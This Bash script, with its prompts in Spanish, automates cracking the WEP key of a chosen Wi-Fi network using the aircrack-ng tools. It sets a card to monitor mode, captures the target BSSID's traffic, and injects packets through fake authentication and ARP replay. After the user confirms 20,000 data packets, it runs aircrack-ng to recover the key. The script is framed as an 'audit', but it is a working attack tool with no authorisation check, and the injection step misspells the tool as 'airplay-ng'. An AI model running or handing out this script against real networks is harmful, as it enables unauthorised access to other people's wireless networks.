#!/bin/bash

ROJO=$(tput setaf 1)
VERDE=$(tput setaf 2)
echo $VERDE
iwconfig | awk '(NR == 1) {print "Tu interfaz de red inalambrica es: "$1 }'
echo -e "\n"
echo "Escribe el nombre de una tarjeta de red para cambiarla a modo monitor "
echo $ROJO
read tarjeta
airmon-ng start $tarjeta
sleep 2
clear
iwconfig | grep mon

echo $VERDE
echo "Escribe el nombre de la intefaz que esta en modo monitor"
echo $ROJO
read monitor

xterm -bg black -fg green -geometry 157-31+1+0 -T "Redes Wifw Disponibles" -e airodump-ng $monitor &

echo $VERDE
echo "Nombre del archivo donde se guardaran los datos capturados"
echo $ROJO
read nombre
echo $VERDE
echo "Escribe el numero del canal de la red WIFI que vas a auditar."
echo $ROJO
read canal
echo $VERDE
echo "Escribe el BSSID de la red WIFI a auditar"
echo $ROJO
read bssid

xterm -bg black -fg green -geometry 157-37+1+0 -T "Crackeando la red wifi" -e airodump-ng -w $nombre -c $canal --bssid $bssid --ignore-negative-one $monitor &
sleep 2

xterm -bg black -fg green -geometry 157-37+1+0 -T "Autenticando" -e aireplay-ng -1 0 -a $bssid --ignore-negative-one $monitor &
sleep 2

xterm -bg black -fg green -geometry 157-37+1+0 -T "Inyectando paquetes" -e airplay-ng -3 -b $bssid --ignore-negative-one $monitor &
sleep 2

echo $VERDE
echo "Para obtener la clave de la red WIFI debes tener mas de 20.000 data escribe el numero 1 y luego de [ Enter ]"
until [ $respuesta = 1 ]
do
	echo "1) Ya tengo mas de 20.000"
	echo "2) Todavia no tengo 20.000 data"
	echo -n  "#?"
	read respuesta
done

aircrack-ng $nombre.cap
sleep 2
airmon-ng stop $monitor
sleep 2





